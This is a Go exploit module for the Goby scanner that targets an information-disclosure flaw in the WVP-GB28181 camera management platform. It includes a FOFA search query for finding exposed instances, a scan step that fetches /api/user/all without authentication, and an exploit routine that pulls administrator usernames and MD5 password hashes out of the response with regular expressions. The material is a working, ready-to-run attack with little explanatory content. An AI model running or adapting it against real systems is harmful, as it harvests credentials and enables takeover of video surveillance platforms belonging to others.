package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "WVP-GB28181 Camera management side /api/user/all Information Disclosure Vulnerability",
    "Description": "<p>WEB VIDEO PLATFORM is an out-of-the-box network video platform based on GB28181-2016 standard, responsible for the implementation of core signaling and equipment management background part, support NAT penetration, support for Hikang, Dahua, Yushi and other brands IPC, NVR access. Support GB cascade, support does not have GB function camera/live stream/live push stream to other GB platform.</p><p>Sensitive information is leaked on the interface /api/user/all. Attackers can obtain the administrator account or md5 password to control the system.</p>",
    "Product": "WEB VIDEO PLATFORM",
    "Homepage": "https://github.com/648540858/wvp-GB28181-pro/",
    "DisclosureDate": "2024-05-17",
    "PostTime": "2024-07-05",
    "Author": "1215816861@qq.com",
    "FofaQuery": "title=\"国标28181\" && body=\"EasyWasmPlayer.js\"",
    "GobyQuery": "title=\"国标28181\" && body=\"EasyWasmPlayer.js\"",
    "Level": "1",
    "Impact": "<p>Sensitive information is leaked on the interface /api/user/all. Attackers can obtain the administrator account or md5 password to control the system.</p>",
    "Recommendation": "<p>The official patch has been updated, please upgrade to the latest version. Website address: <a href=\"https://github.com/648540858/wvp-GB28181-pro/\">https://github.com/648540858/wvp-GB28181-pro/</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/TVVUhTu6a3ObOgN8i3OFug"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "username and passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/user/all",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    "Priority": "u="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/api/user/all"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/user/all",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    "Priority": "u="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(\"password\"|\"username\"):\"[\\w\\W]*?\""
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "3.5",
    "Translation": {
        "CN": {
            "Name": "WVP-GB28181摄像头管理端 /api/user/all 信息泄露漏洞",
            "Product": "WEB VIDEO PLATFORM",
            "Description": "<p>WEB VIDEO PLATFORM是一个基于GB28181-2016标准实现的开箱即用的网络视频平台，负责实现核心信令与设备管理后台部分，支持NAT穿透，支持海康、大华、宇视等品牌的IPC、NVR接入。支持国标级联，支持将不带国标功能的摄像机/直播流/直播推流转发到其他国标平台。<br></p><p>其接口/api/user/all存在敏感信息泄露，攻击者可获取到管理员账号/md5密码，从而控制系统。<br></p>",
            "Recommendation": "<p>官方已更新补丁，请升级至最新版本。官网地址：<a href=\"https://github.com/648540858/wvp-GB28181-pro/\">https://github.com/648540858/wvp-GB28181-pro/</a><br></p>",
            "Impact": "<p>接口/api/user/all存在敏感信息泄露，攻击者可获取到管理员账号/md5密码，从而控制系统。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "WVP-GB28181 Camera management side /api/user/all Information Disclosure Vulnerability",
            "Product": "WEB VIDEO PLATFORM",
            "Description": "<p>WEB VIDEO PLATFORM is an out-of-the-box network video platform based on GB28181-2016 standard, responsible for the implementation of core signaling and equipment management background part, support NAT penetration, support for Hikang, Dahua, Yushi and other brands IPC, NVR access. Support GB cascade, support does not have GB function camera/live stream/live push stream to other GB platform.<br></p><p>Sensitive information is leaked on the interface /api/user/all. Attackers can obtain the administrator account or md5 password to control the system.<br></p>",
            "Recommendation": "<p>The official patch has been updated, please upgrade to the latest version. Website address: <a href=\"https://github.com/648540858/wvp-GB28181-pro/\">https://github.com/648540858/wvp-GB28181-pro/</a><br></p>",
            "Impact": "<p>Sensitive information is leaked on the interface /api/user/all. Attackers can obtain the administrator account or md5 password to control the system.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10969"
}`

	postOrGet := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/api/user/all"
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Content-Length":  "636",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Sl-Ce-Suid":      "29",
			"Accept-Encoding": "gzip, deflate, br",
		}
		resp, err := setGetRequest(hostInfo, path, header)
		if err != nil || resp.StatusCode != 200 || !strings.Contains(resp.RawBody, "password") {
			return "", err
		}
		respTxt := ""
		reg1 := regexp.MustCompile(`"password":"(.*?)"`)
		reg2 := regexp.MustCompile(`"username":"(.*?)"`)
		matches1 := reg1.FindString(resp.RawBody)
		matches2 := reg2.FindString(resp.RawBody)
		if len(matches1) > 0 && len(matches2) > 0 {
			respTxt = matches1 + matches2
		} else {
			return "", errors.New("没匹配到!")
		}
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/api/user/all"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/api/user/all": "username"}
			// 函数继承
			uploadFileFunc := postOrGet

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"username and passwd": {"/api/user/all", "username"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
